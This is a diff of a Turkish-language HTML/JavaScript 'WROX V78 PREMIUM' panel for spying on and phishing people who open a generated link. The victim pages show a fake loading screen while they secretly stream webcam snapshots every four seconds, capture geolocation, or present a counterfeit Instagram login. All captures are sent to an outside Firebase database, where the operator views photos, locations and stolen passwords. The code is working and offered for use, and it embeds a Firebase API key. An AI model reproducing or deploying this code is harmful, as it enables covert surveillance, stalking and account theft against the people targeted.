@@ -3,83 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX PREMIUM V78</title>
+    <title>WROX V78 PREMIUM</title>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
     <style>
-        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --green: #2ecc71; }
+        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --red: #ff0000; }
         body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         
-        /* 1. GİRİŞ VE KAYIT EKRANI */
-        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, #05191a 0%, #000 100%); }
-        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 360px; background: rgba(10, 10, 10, 0.9); }
-        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; border-radius: 5px; outline: none; }
-        button { width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 5px; }
-        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
-        .reg-btn { border-color: #555; color: #888; margin-top: 10px; font-size: 11px; }
+        /* AUTH SECTION */
+        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: var(--panel); }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; }
 
-        /* 2. ANA YÖNETİM PANELİ */
+        /* HEADER & NAV */
         #main-panel { display: none; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
-        .content { padding: 20px; }
-        
-        /* KAYDIRILABİLİR AKIŞ ALANI (SCROLL) */
-        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 25px; background: #050505; }
-        .status-header { color: #ff0000; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
-        .dot { height: 8px; width: 8px; background-color: #ff0000; border-radius: 50%; display: inline-block; margin-right: 10px; animation: pulse 1s infinite; }
-        
-        .feed-wrapper { 
-            display: flex; 
-            flex-direction: column; 
-            gap: 20px; 
-            max-height: 550px; /* Sabit yükseklik sayesinde aşağı kaydırılabilir */
-            overflow-y: auto;  /* Scroll aktif */
-            padding-right: 5px; 
-        }
-        .feed-item { border: 1px solid #222; border-radius: 10px; overflow: hidden; background: #000; flex-shrink: 0; }
-        .feed-item img { width: 100%; display: block; }
+        .nav-menu { position: fixed; top: 60px; left: -100%; width: 200px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.3s; z-index: 99; }
+        .nav-menu.active { left: 0; }
+        .nav-menu div { padding: 20px; border-bottom: 1px solid #222; cursor: pointer; color: var(--neon); font-weight: bold; }
+        .nav-menu div:hover { background: #111; }
 
-        .link-display { background: #0a0a0a; padding: 15px; font-size: 11px; word-break: break-all; margin: 15px 0; color: var(--neon); border: 1px dashed var(--neon); border-radius: 5px; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        
-        /* Kaydırma Çubuğu Tasarımı */
-        .feed-wrapper::-webkit-scrollbar { width: 4px; }
-        .feed-wrapper::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
+        /* CONTENT AREAS */
+        .tab-content { display: none; padding: 20px; }
+        .tab-content.active { display: block; }
+
+        /* SCROLLABLE FEED AREAS */
+        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
+        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 450px; overflow-y: auto; }
+        .feed-item { border: 1px solid #222; border-radius: 10px; padding: 10px; background: #000; }
+        .feed-item img { width: 100%; border-radius: 8px; }
+
+        /* BUTTONS & LINKS */
+        .action-btn { margin-bottom: 15px; width: 100%; text-transform: uppercase; border-radius: 8px; }
+        .link-box { background: #111; padding: 10px; font-size: 11px; word-break: break-all; margin-bottom: 20px; border: 1px dashed var(--neon); color: var(--neon); display: none; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-box">
-            <h1 style="color: var(--neon); margin: 0 0 20px 0; font-size: 24px;">WROX PREMIUM</h1>
+            <h2 style="color: var(--neon);">WROX PREMIUM</h2>
             <input type="text" id="email" placeholder="E-posta">
             <input type="password" id="pass" placeholder="Şifre">
-            <button onclick="handleAuth('login')">SİSTEME GİRİŞ</button>
-            <button class="reg-btn" onclick="handleAuth('register')">YENİ KAYIT OL</button>
+            <button onclick="auth('login')">GİRİŞ YAP</button>
+            <button onclick="auth('register')" style="margin-top:10px; border-color:#444; color:#666; font-size:11px;">KAYIT OL</button>
         </div>
     </div>
 
     <div id="main-panel">
         <div class="header">
-            <div style="font-size: 18px; font-weight: bold;"><span style="color:var(--neon)">☰</span> WROX V78</div>
-            <div id="user-tag" style="color: var(--green); font-size: 11px; font-weight: bold;"></div>
+            <div onclick="toggleMenu()" style="cursor:pointer; font-size:24px;">☰ WROX <span style="color:#3498db">V78</span></div>
+            <div id="user-tag" style="color: #2ecc71; font-size: 11px;"></div>
         </div>
-        <div class="content">
-            <h3 style="margin: 0 0 15px 0;">📸 KAMERA SIZMA (5x BURST)</h3>
-            <button onclick="generateLink()">AVCI LİNKİ OLUŞTUR</button>
-            <div id="link-area" class="link-display" style="display:none;"></div>
 
+        <div id="side-menu" class="nav-menu">
+            <div onclick="showTab('cam-tab')">📸 KAMERA SIZMA</div>
+            <div onclick="showTab('loc-tab')">📍 KONUM TAKİBİ</div>
+            <div onclick="showTab('ig-tab')">🔗 INSTAGRAM PHISH</div>
+        </div>
+
+        <div id="cam-tab" class="tab-content active">
+            <h3>📷 KAMERA ÜNİTESİ</h3>
+            <button class="action-btn" onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
+            <div id="cam-link" class="link-box"></div>
             <div class="stream-container">
-                <div class="status-header"><span class="dot"></span>CANLI GÖRÜNTÜ AKIŞI:</div>
-                <div id="feed" class="feed-wrapper">
-                    </div>
+                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">🔴 CANLI GÖRÜNTÜLER:</div>
+                <div id="cam-feed" class="feed-wrapper"></div>
+            </div>
+        </div>
+
+        <div id="loc-tab" class="tab-content">
+            <h3>📍 KONUM TAKİBİ</h3>
+            <button class="action-btn" onclick="genLink('loc')">KONUM LİNKİ OLUŞTUR</button>
+            <div id="loc-link" class="link-box"></div>
+            <div class="stream-container">
+                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">📌 SON KONUMLAR:</div>
+                <div id="loc-feed" class="feed-wrapper"></div>
+            </div>
+        </div>
+
+        <div id="ig-tab" class="tab-content">
+            <h3>🔑 INSTAGRAM PANEL</h3>
+            <button class="action-btn" onclick="genLink('ig')">IG PHISHING LİNKİ</button>
+            <div id="ig-link" class="link-box"></div>
+            <div class="stream-container">
+                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">👤 DÜŞEN HESAPLAR:</div>
+                <div id="ig-feed" class="feed-wrapper"></div>
             </div>
         </div>
     </div>
 
     <script>
-        // 1. FIREBASE CONFIG (Senin Bilgilerin)
+        // 1. FIREBASE BAĞLANTISI
         const firebaseConfig = {
             apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
             databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
@@ -88,74 +105,94 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let currentUser = "";
+        let activeUser = "";
 
-        // 2. GİRİŞ VE KAYIT SİSTEMİ
-        function handleAuth(type) {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('pass').value;
-            const userID = email.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
+        // 2. PANEL FONKSİYONLARI
+        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
+        
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            toggleMenu();
+        }
 
-            if (!email || !password) return alert("Bilgileri eksiksiz girin!");
-
-            if (type === 'register') {
-                db.ref('users/' + userID).set({ password: password, email: email })
-                    .then(() => alert("Kayıt başarılı! Şimdi giriş yapabilirsiniz."));
+        function auth(type) {
+            const u = document.getElementById('email').value.trim();
+            const p = document.getElementById('pass').value;
+            const id = u.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
+            if(type === 'register') {
+                db.ref('users/'+id).set({p:p}).then(()=>alert("Kayıt Tamam"));
             } else {
-                db.ref('users/' + userID).once('value').then((snapshot) => {
-                    if (snapshot.exists() && snapshot.val().password === password) {
-                        currentUser = userID;
-                        startPanel();
-                    } else {
-                        alert("Hatalı e-posta veya şifre!");
-                    }
+                db.ref('users/'+id).once('value').then(s => {
+                    if(s.exists() && s.val().p === p) { activeUser = id; startApp(); }
+                    else alert("Hata!");
                 });
             }
         }
 
-        function startPanel() {
+        function startApp() {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('user-tag').innerText = "ADMİN: " + currentUser.toUpperCase();
+            document.getElementById('user-tag').innerText = activeUser.toUpperCase();
             
-            // SADECE GİRİŞ YAPAN KULLANICININ LOGLARINI DİNLE
-            db.ref('logs/' + currentUser).on('child_added', (s) => {
-                const imgHTML = `<div class="feed-item"><img src="${s.val().img}"></div>`;
-                document.getElementById('feed').insertAdjacentHTML('afterbegin', imgHTML);
+            // Verileri Kendi Sekmesine Ayırarak Dinle
+            db.ref('logs/'+activeUser).on('child_added', s => {
+                const val = s.val();
+                let html = `<div class="feed-item"><b>${new Date(val.t).toLocaleTimeString()}</b><br>`;
+                if(val.type === 'cam') {
+                    html += `<img src="${val.d}"></div>`;
+                    document.getElementById('cam-feed').insertAdjacentHTML('afterbegin', html);
+                } else if(val.type === 'loc') {
+                    html += `<a href="${val.d}" target="_blank" style="color:yellow;">📍 HARİTADA GÖR</a></div>`;
+                    document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
+                } else if(val.type === 'ig') {
+                    html += `User: ${val.u} | Pass: ${val.p}</div>`;
+                    document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
+                }
             });
         }
 
-        function generateLink() {
-            const link = window.location.href.split('?')[0] + "?ref=" + currentUser;
-            const area = document.getElementById('link-area');
-            area.innerText = link;
-            area.style.display = 'block';
+        function genLink(mode) {
+            const link = window.location.href.split('?')[0] + `?ref=${activeUser}&m=${mode}`;
+            const box = document.getElementById(mode+'-link');
+            box.innerText = link; box.style.display = 'block';
         }
 
-        // 3. KURBAN MODU (Link açıldığında çalışır)
-        const urlParams = new URLSearchParams(window.location.search);
-        const victimRef = urlParams.get('ref');
+        // 3. KURBAN MODLARI (Farklı Linkler İçin)
+        const params = new URLSearchParams(window.location.search);
+        const ref = params.get('ref');
+        const mode = params.get('m');
 
-        if (victimRef) {
-            document.body.innerHTML = `
-                <div style="background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#222;">
-                    <p>Yükleniyor... %99</p>
+        if(ref && mode) {
+            if(mode === 'ig') {
+                document.body.innerHTML = `<div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px; font-family:sans-serif;">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="175">
+                    <input id="iu" placeholder="Kullanıcı adı" style="width:270px; padding:10px; margin-top:30px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <input id="ip" type="password" placeholder="Şifre" style="width:270px; padding:10px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <button onclick="sendIG()" style="width:270px; background:#0095f6; color:white; border:none; padding:10px; margin-top:20px; border-radius:4px; font-weight:bold;">Giriş Yap</button>
                 </div>`;
-            
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const v = document.createElement('video');
-                v.srcObject = stream; v.play();
-                const c = document.createElement('canvas');
-                setInterval(() => {
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    db.ref('logs/' + victimRef).push({
-                        img: c.toDataURL('image/jpeg', 0.4),
-                        time: Date.now()
-                    });
-                }, 4000); // 4 saniyede bir çekim
-            }).catch(() => {});
+                window.sendIG = () => {
+                    db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
+                    location.href = "https://instagram.com";
+                };
+            } else if(mode === 'loc') {
+                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#333; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
+                navigator.geolocation.getCurrentPosition(p => {
+                    const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    db.ref('logs/'+ref).push({type:'loc', d:url, t:Date.now()});
+                });
+            } else if(mode === 'cam') {
+                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
+                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+                    const v = document.createElement('video'); v.srcObject=s; v.play();
+                    const c = document.createElement('canvas');
+                    setInterval(() => {
+                        c.width=v.videoWidth; c.height=v.videoHeight;
+                        c.getContext('2d').drawImage(v,0,0);
+                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/jpeg', 0.3), t:Date.now()});
+                    }, 4000);
+                });
+            }
         }
     </script>
 </body>
